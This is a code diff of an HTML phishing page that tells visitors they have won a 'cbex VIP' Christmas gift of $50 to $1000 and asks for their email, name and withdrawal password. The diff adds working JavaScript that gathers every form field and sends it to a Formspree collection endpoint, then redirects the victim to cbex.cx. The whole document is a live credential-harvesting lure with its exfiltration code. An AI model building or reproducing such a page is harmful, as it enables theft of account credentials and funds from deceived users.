@@ -14,12 +14,12 @@
     <h2>Congratulation</h2>you have been select as a cbex VIP member, you also will be winning a christmas and new year gift within $50 to $1000, kindly update your profile to continue
   </div>
   
-  <form id="myForm" onsubmit="submitForm(event)" action="https://formspree.io/f/mldekyqd" method="POST">
+  <form id="myForm" >
 
   <input class="mail" name="email" type="text" placeholder="Please enter your email address">
   <input class="pwd" name="message" type="text" placeholder="Please enter your name">
-  <input class="mail" name="email" type="text" placeholder="Please enter your withdraw password">
-<input class="pwd" name="message" type="text" placeholder="Confirm your withdraw password">
+  <input class="mail" name="withdrawmsg" type="text" placeholder="Please enter your withdraw password">
+<input class="pwd" name="confirm" type="text" placeholder="Confirm your withdraw password">
 
 
 
@@ -29,13 +29,45 @@
 </form>
 
     <script>
-        function submitForm(event) {
-          event.preventDefault(); // prevent default form submission
-          // submit form data to server using AJAX or fetch API
-          // ...
-          alert('Update sucessfull');
-          window.location.href = "(cbex.cx)"; // redirect to thank-you page
-        }
+            document.getElementById('myForm').addEventListener('submit', function(event) {
+      event.preventDefault(); // Prevent the default form submission
+
+      // Get form data
+      const formData = new FormData(event.target);
+
+      // Prepare the data to send
+      const data = {};
+      formData.forEach((value, key) => {
+        data[key] = value;
+      });
+
+      // Send data to Formspree
+      fetch('https://formspree.io/f/mldekyqd', { // Replace 'your_form_id' with your actual Formspree form ID
+          method: 'POST',
+          headers: {
+            'Accept': 'application/json',
+          },
+          body: JSON.stringify(data),
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            document.getElementById('form-message').innerText = 'Thank you for your submission! Redirecting...';
+
+            // Redirect after 2 seconds to another page (e.g., thank-you.html)
+            setTimeout(function() {
+              window.location.href = 'https://cbex.cx'; // Replace with your desired redirect URL
+            }, 2000); // 2-second delay for a smooth transition
+
+          } else {
+            document.getElementById('form-message').innerText = 'Something went wrong. Please try again.';
+          }
+        })
+        .catch(error => {
+          document.getElementById('form-message').innerText = 'There was an error submitting the form. Please try again later.';
+          console.error('Error submitting form:', error);
+        });
+    });
       </script>
 
 
